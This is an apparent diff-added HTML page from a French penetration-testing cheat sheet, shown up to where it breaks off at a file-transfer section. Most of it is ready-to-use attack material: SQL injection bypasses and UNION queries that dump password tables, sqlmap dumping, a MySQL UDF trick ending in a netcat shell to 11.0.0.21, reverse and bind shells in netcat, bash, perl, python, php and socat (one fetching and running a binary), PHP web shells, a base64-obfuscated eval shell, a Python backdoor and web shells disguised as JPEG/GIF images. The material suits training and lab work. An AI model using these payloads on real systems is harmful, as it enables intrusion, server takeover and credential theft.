+<br>
+Nginx<br>
+/var/log/nginx/access.log<br>
+/var/log/nginx/error.log<br>
+<br>
+Ssh<br>
+/var/log/sshd.log<br>
+<br>
+Il est possible de vérifier l'emplacement des fichiers de logs en lisant les fichiers de config.<br>
+Fichier de config de Nginx: /etc/nginx/nginx.conf<br>
+Entrée du fichier de config : access_log /spool/logs/nginx-access.log<br></p></div>
+                   </div>
+    
+
+                        <div class="row no-border  my-4 map-color-bg-normal map-color-text pl-1">
+                        <h4 class="my-vertical-centered" id="chapter_SQLi">SQLi
+                        </h4>
+                        </div>
+                                <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=principe">Principe</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Injecter des commandes SQL dans les paramêtres pour réécrire la requête.</p>
+<pre><code>SELECT * FROM user WHERE login='[USER]' and password='[PASSWORD]';
+</code></pre>
+<p>Méthode : fermer la ', élargir la requête avec OR 1=1, ajouter des valeurs avec UNION, commenter la fin de la requête avec # ou -- -</p>
+<pre><code>Valeur des paramètres envoyés :
+USER=admin' OR 1=1 -- -
+PASSWORD=ferrari
+
+Requète SQL obtenue:
+SELECT * FROM user WHERE login='admin' OR 1=1 -- - and password='ferrari';
+</code></pre>
+<p>Envoyer les paramètres avec Curl:</p>
+<pre><code>curl http://target/login.pgp?login=admin' OR 1=1 -- -&amp;password=ferrari
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=sqli-fun">Les Exploits de maman</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><img src="https://imgs.xkcd.com/comics/exploits_of_a_mom.png"> 
+<ul>
+<li>Bonjour, c'est l'école de votre fils. Nous avons des petits soucis informatiques.</li>
+<li>A-t-il cassé quelque chose ?</li>
+<li>D'une certaine manière</li>
+<li>Avez vous réellement donné comme prénom à votre fils: Robert'); DROP TABLE Students; -- ?</li>
+<li>Oh, oui, on le surnomme notre petit Bobby Tables</li>
+<li>Nous venons de perdre l'intégralité des données sur les étudiants. J'espère que vous êtes satisfaite.</li>
+<li>Et moi j'espère que vous avez appris à filtrer vos données utilisateurs</li>
+</ul></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=sql-mysql">MySQL/MariaDB - Commandes</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Connect to a remote mysql database:</p>
+<pre><code>mysql -u admin --host=10.10.12.10 : without password
+mysql -u admin --host=10.10.12.10 -padmin : with password
+</code></pre>
+<p>Usefull commands:</p>
+<pre><code>SELECT @@version;
+SELECT user();
+SHOW Databases;
+USE database;
+SHOW tables;
+SELECT * from table;
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=detect">Détecter une SQLi</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Vous êtes devant une page web contenant un formulaire de login/register/search,...
+Saisissez des fermetures de string ' ou " pour générer une erreur.<br>
+Injecter un sleep et remarquer un retard de la réponse.</p>
+<pre><code>admin' and sleep(5) and '1'='1
+admin" and sleep(5) and "1"="1
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=detect">Détecter une SQLi : Polyglot</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Un polyglot est une séquence capable de s'adapter à de nombreux scénario</p>
+<pre><code>/*$(sleep 5)`sleep 5``*/sleep(5)#'/*$(sleep 5)`sleep 5` #*/||sleep(5)||'"||sleep(5)||"`
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=limit">Selectionner une seule entrée</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Généralement les développeurs prennent la première entrée. Mais parfois ils vérifient qu'il n'y en a bien qu'une seule.</p>
+<pre><code>admin' or 1=1 LIMIT 1 -- -
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=simplefilter">Contourner les filtres simple</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Les développeurs filtrent parfois de caractères ou des mot:</p>
+<pre><code>Space =&gt; Tab %09, Newline %A0, /**/
+AND   =&gt; &amp;&amp; %26%26
+OR    =&gt; ||
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=union">Injecter des valeurs avec un UNION</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Quand la requête sert à afficher des entrées (ex: liste d'objets), on peut ajouter des valeurs avec un UNION.<br>
+Il faut commencer par identifier le nombre d'entrées qu'attend le select<br></p>
+<pre><code>SELECT id, name, desc, price FROM stock WHERE name=[NAME]
+</code></pre>
+<p>Methode 1: ORDER BY</p>
+<pre><code>SELECT id, name, desc, price FROM stock WHERE name='mouse' order by 1-- - : Ok
+SELECT id, name, desc, price FROM stock WHERE name='mouse' order by 2-- - : Ok
+SELECT id, name, desc, price FROM stock WHERE name='mouse' order by 3-- - : Ok
+SELECT id, name, desc, price FROM stock WHERE name='mouse' order by 4-- - : Ok
+SELECT id, name, desc, price FROM stock WHERE name='mouse' order by 5-- - : Erreur
+=&gt; 4 entrées
+</code></pre>
+<p>Methode 2: SELECT</p>
+<pre><code>SELECT id, name, desc, price FROM stock WHERE name='mouse' UNION SELECT 1 : Erreur
+SELECT id, name, desc, price FROM stock WHERE name='mouse' UNION SELECT 1,2 : Erreur
+SELECT id, name, desc, price FROM stock WHERE name='mouse' UNION SELECT 1,2,3 : Erreur
+SELECT id, name, desc, price FROM stock WHERE name='mouse' UNION SELECT 1,2,3,4 : Ok
+=&gt; 4 entrées
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=uniontablenames">UNION: Table names</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><pre><code>SELECT id, name, desc, price FROM stock WHERE name='mouse' UNION SELECT 1,2,table_name,table_name FROM information_schema.tables; -- -  
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=uniontablecolumnnames">UNION: Table columns names</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><pre><code>SELECT id, name, desc, price FROM stock WHERE name='mouse' UNION SELECT 1,2,column_name,column_name FROM information_schema.columns WHERE  table_name='users'; -- -
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=uniontablecolumnnames">UNION: Dump table</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><pre><code>UNION SELECT concat(name,':',pass),1 FROM users; -- -
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=sqlmap">SqlMap</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>SQLi sur les paramètres d'un GET</p>
+<pre><code>$ sqlmap -u 'http://10.10.10.129/sqli/example1.php?name=root' --dbs --banner
+</code></pre>
+<p>SQLi sur les paramètres d'un POST. <br>
+Intercepter la requète avec Burp, et la sauver dans un fichier login.txt</p>
+<pre><code>$ sqlmap -r login.txt --dbs --banner
+  -p name : forcer le paramètre à tester
+</code></pre> 
+<p>Lister les tables, puis dumper une table</p>
+<pre><code>$ sqlmap -r login.txt -D jetadmin --tables
+$ sqlmap -r login.txt -D jetadmin -T users --dump
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=mysqludf">MySQL: UDF User Defined Function</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Compiler une librairie UDF contenant le fonction sys_exec()<br>
+L'uploader sur le serveur. La déclarer. La fonction sys_exec() permet de lancer des commandes.</p>
+<pre><code># Tested with : mysql 5.5.60-0+deb8u1
+# Create a 'User Defined Function' calling C function 'system'
+# Use pre-compiled 32 or 64 depending on target.
+# Copy file to /tmp
+create database exploittest;
+use exploittest;
+create table bob(line blob);
+insert into bob values(load_file('/tmp/lib_mysqludf_sys.so'));
+select * from bob into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so
+create function sys_exec returns int soname 'lib_mysqludf_sys.so';
+select sys_exec('nc 11.0.0.21 4444 -e /bin/bash');
+
+select sys_exec('/bin/sh');
+after bash access, 'bash –p' or 'sudo su'
+</code></pre></div>
+                   </div>
+    
+
+                        <div class="row no-border  my-4 map-color-bg-normal map-color-text pl-1">
+                        <h4 class="my-vertical-centered" id="chapter_Web_Shell">Web Shell
+                        </h4>
+                        </div>
+                                <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=ncprinciple">Principe</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Vous avez trouvé une requête web qui permet d'executer des commandes sur le serveur, ou vous avez reussi à trouver comment uploader un fichier qui peut être exécuté.<br>
+Votre objectif maintenant est d'obtenir un shell sur la machine, ce qui permettra une exploitation confortable.<br>
+Vous allez utiliser les outils installés sur le serveur (netcat, bash, php, python, perl, ...) pour ouvrir un shell sur le serveur et le connecter à votre shell.</p></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=nc">Netcat</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Netcat, est le couteau suisse des connections entre serveurs.<br>
+Il peut se mettre en écoute, se connecter et lancer des shells.<br>
+<br>
+Les anciennes versions possédaient l'option -e ou -c qui permet de lancer un shell. Les version récentes ne possèdent plus cette option pour des raisons de sécurité<br>
+Sur Kali on trouve une version 1.10 en :</p>
+<pre><code>/usr/bin/nc -h
+    -e shell commands : program to execute
+    -c shell commands : program to execute
+    -l                : listen mode
+    -v                : verbose
+    -p port           : local port number
+</code></pre>
+<p>Pour se connecter sur le port 3000 du serveur 10.0.0.11:</p>
+<pre><code>/usr/bin/nc 10.0.0.11 3000
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=ncreverse">Netcat - Reverse Shell (-e version)</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Mettre un nc en écoute sur la kali</p>
+<pre><code>nc -lvp 4444
+</code></pre>
+<p>Lancer un reverse shell sur le serveur, qui lance un shell, vient se connecter sur le netcat en écoute, et donne accès au shell.</p>
+<pre><code>nc -e /bin/sh IPKALI 4444
+</code></pre>
+<p>Pour utiliser un reverse shell il faut connaitre l'IP publique de sa Kali.</p></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=ncreversenoe">Netcat - Reverse Shell (sans -e)</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Mettre un nc en écoute sur la kali</p>
+<pre><code>nc -lvp 4444
+</code></pre>
+<p>Lancer un reverse shell sur le serveur, qui lance un shell, vient se connecter sur le netcat en écoute, et donne accès au shell.</p>
+<pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc IPKALI 4444 &gt;/tmp/f
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=ncupgrade">Upgrader son shell netcat avec un tty</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Le shell obtenu avec nc est basique. Ce n'est pas un tty.<br>
+Certaines commandes comme su vont refuser de fonctionner.<br>
+Pour upgrader notre shell, utiliser python pour avoir un shell de type tty:</p>
+<pre><code>python -c 'import pty; pty.spawn("/bin/bash")'
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=ncupgrade2">Upgrader son shell avec historique et completion</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Le shell obtenu avec nc est basique. La completion avec le Tab, l'historique avec les flèches ne sont pas gérés.<br>
+<br>
+Passer le nc en arrière plan avec:</p>
+<pre><code>Ctr-Z
+</code></pre>
+<p>Puis demander au shell actuel de passer les codes des touches brutes au shell distant, et repasser sur le netcat (foreground)</p>
+<pre><code>stty raw -echo
+fg
+</code></pre>
+<p>Attention: Tenter cette manip dans un browser va juste freezer le shell. Le browser modifie lui aussi les codes des touches. Ca ne marche que dans une VM.</p></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=ncwebfriendly">Webshell copain friendly</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Tant que votre nc est connecté, vous bloquez un thread du serveur web.
+En fonction de la configuration du serveur, il peut avoir 6, 16, 32 threads... Dont autant de nc en parallèles avant saturation.
+Pour libérer le serveur pour les copains:
+Dans le nc connecté, choisissez un second port et lancez un second bindshell netcat en arrière plan:</p>
+<pre><code>binshell: 
+nohup bash -c 'while true; do nc -e /bin/bash -lvp 4445; done;' &amp;
+
+reverse shell: 
+nohup bash -c 'bash -i &gt;&amp; /dev/tcp/IPKALI/4444 0&gt;&amp;1' &amp;
+</code></pre>
+<p>La commande nohup va détacher le process nc du shell en cours.
+Faites un Ctrl-C pour couper la connection nc, la page avec votre webshell se libère. Un autre utilisateur peut se connecter.
+Lancer un nouveau nc pour vous connecter à ce nouveau bindshell.</p></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=ncbind">Netcat - Bind shell</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Un bind shell est utile quand notre Kali est derrière un NAT.
+Ce shell est fragile, un scan de port va le déclencher et le fermer.
+Lance un shell, ouvre une socket TCP en écoute sur le port 4444, et donne accès au shell au premier qui se connecte.</p>
+<pre><code>nc -e /bin/sh -lvp 4444
+</code></pre>
+<p>Se connecte au netcat distant pour avoir accès au shell.</p>
+<pre><code>nc iptarget 4444
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=ncbindnoe">Netcat - Bind Shell (without -e option)</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Lancer un bind shell sur la cible</p>
+<pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash 2&gt;&amp;1|nc -lp 4444 &gt;/tmp/f
+</code></pre>
+<p>Se connecter avec un nc </p>
+<pre><code>nc victim 4444
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=socat">Shell: Socat</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Socat est un nc sous stéroides. Il permet une authentification, un chiffrement des communications et un forward de ports.<br>
+On le trouve rarement sur les serveurs, il faut l'uploader.<br>
+Mettre un socat en écoute</p>
+<pre><code>socat file:`tty`,raw,echo=0 TCP-L:4444
+</code></pre>
+<p>Lancer un reverse shell avec un socat</p>
+<pre><code>$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444
+</code></pre>
+<p>Automatiser l'upload et le reverse shell:</p>
+<pre><code>wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=pwncat">Shell: Pwncat</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Pwncat est un nc sous stéroides. </p>
+<pre><code>https://github.com/cytopia/pwncat
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=bash">Reverse shell: Bash</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Netcat et python ne sont pas installés sur le serveur. Il est toujours possible de lancer un reverse shell en bash.<br>
+Mettre un nc en écoute votre host:</p>
+<pre><code>nc -lvp 4444
+</code></pre>
+<p>Lancer le reverse shell à partir de votre cible:</p>
+<pre><code>bash -i &gt;&amp; /dev/tcp/IPKALI/4444 0&gt;&amp;1
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=perl">Reverse shell: Perl</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Mettre un nc en écoute sur la kali</p>
+<pre><code>nc -lvp 4444
+</code></pre>
+<pre><code>perl -e 'use Socket;$i="IPKALI";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=python">Reverse shell: Python</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Mettre un nc en écoute sur la kali</p>
+<pre><code>nc -lvp 4444
+</code></pre>
+<pre><code>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((IPKALI,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(/bin/bash)'
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=php">Reverse shell: Php</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Mettre un nc en écoute sur la kali</p>
+<pre><code>nc -lvp 4444
+</code></pre>
+<pre><code>php -r '$sock=fsockopen("IPKALI",4444);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=webphp">Web server: cmd.php</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Si vous pouvez uploader un fichier php sur le serveur web, le fichier ci-dessous vous permettra de lancer des commandes shell:</p>
+<pre><code>&lt;?php echo 'Shell: ';system($_GET['cmd']); ?&gt;
+</code></pre>
+<p>Lancer la commande 'id' sur le server</p>
+<pre><code>curl http://IPSERVER/cmd.php?cmd=id
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=webphp22">Web server: cmd.php (clean html)</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Uploader la page</p>
+<pre><code>&lt;pre&gt;&lt;?php echo 'Shell: ';system($_GET['cmd']); ?&gt;&lt;/pre&gt;
+</code></pre>
+<p>Lancer la commande 'id' sur le server</p>
+<pre><code>curl http://IPSERVER/cmd.php?cmd=id
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=webphpbase64">Web server: PHP encodage base64</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Parfois certain caractères comme les ; les &amp; ou les | sont filtrés. Un encodage base64 permet de s'en sortir.<br>
+Dans un shell encoder en base64:</p>
+<pre><code>$ printf 'system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc IPKALI 4444 &gt;/tmp/f");' | base64
+</code></pre>
+<p>Code PHP du reverse shell</p>
+<pre><code>eval(base64_decode('c3lzdGVtKCJyEtxxxxxxxxxEkgNDQ0NCA+L3RtcC9mIik7='));
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=pythonbind">Python bind shell</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><pre><code>import sys,socket,time,re,subprocess,os
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
+sock.bind(('0.0.0.0',4444))
+sock.listen(5)
+conn,addr = sock.accept()
+conn.send('== YOLO Backdoor ==\n\n&gt;')
+while 1:         
+    data = conn.recv(1024)
+    cmd = data.strip().split(' ')
+    if cmd[0] == 'cd':
+        os.chdir(cmd[1])
+    elif cmd[0] in ('exit'):
+        break
+    else:
+        conn.send(subprocess.check_output(cmd)+'\n&gt;') 
+conn.close()
+sock.shutdown(socket.SHUT_RDWR)
+sock.close()
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=imgwebshell">File upload Webshell : Jpeg</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Si vous pouvez upload un fichier jpg, il est possible d'y cacher un webshell.<br>
+Un fichier jpeg est identifié par ses premiers octets qui ont la valeur : ffd8ffe0  <br>
+Pour générer un fichier qui sera identifié comme ayant une entête Jpeg valide:</p>
+<pre><code>printf "\xff\xd8\xff\xe0&lt;?php system('id'); ?&gt;" &gt; webshell.jpg
+</code></pre>
+<p>Ce fichier sera reconnu comme un fichier jpg</p>
+<pre><code>$ file webshell.jpg 
+webshell.jpg: JPEG image data
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=imgwebshell2">File upload Webshell : Gif</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Un fichier gif est identifié par ses premiers octets qui ont la valeur : GIF89a;  <br>
+Pour générer un fichier qui sera identifié comme ayant une entête gif valide:<br></p>
+<pre><code>printf "GIF89a;&lt;?php system('id'); ?&gt;" &gt; webshell.gif
+</code></pre>
+<p>Ce fichier sera reconnu comme un fichier gif</p>
+<pre><code>$ file webshell.gif 
+webshell.gif: GIF image data
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=imgwebshell">File upload Webshell : Exif datas</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>Un fichier image contient de nombreuses informations : date de prise de vue, localisation, type d'appareil photo...<br>
+Nous pouvons injecter du code php dans ces données.</p>
+<pre><code>exiftool -Comment='&lt;?php system('id'); ?&gt;' webshell.jpg
+</code></pre></div>
+                   </div>
+    
+        <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=payloadallthethings">References: PayloadAllTheThings et PentestMonkey</a>
+			</div>
+				
+				<div class="col-sm-12 map-color-text "><p>A lire pour en savoir plus:<br>
+Liste de webshells</p>
+<pre><code>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+</code></pre>
+<p>Webshell en pure php: <a href="php-reverse-shell.php.txt">php-reverse-shell.php</a></p>
+<pre><code>https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+</code></pre>
+<p>Yop Webshell: <a href="yopwebshell.php.txt">yopwebshell.php</a><br>
+Yolo Webshell: <a href="yolowebshell.php.txt">yolowebshell.php</a></p></div>
+                   </div>
+    
+
+                        <div class="row no-border  my-4 map-color-bg-normal map-color-text pl-1">
+                        <h4 class="my-vertical-centered" id="chapter_Transferts_de_fichiers">Transferts de fichiers
+                        </h4>
+                        </div>
+                                <div class="row border-map-normal map-color-back-transparent target-panel" style="margin-left: 15px; margin-right: 15px; margin-bottom: 10px; margin-top: 10px;">
+           <div class="col-sm-12 map-color-text font-weight-bold " style="margin-bottom: 10px;">
+				<a href="toolbox.php?id=principe">Principe</a>
+			</div>
+				
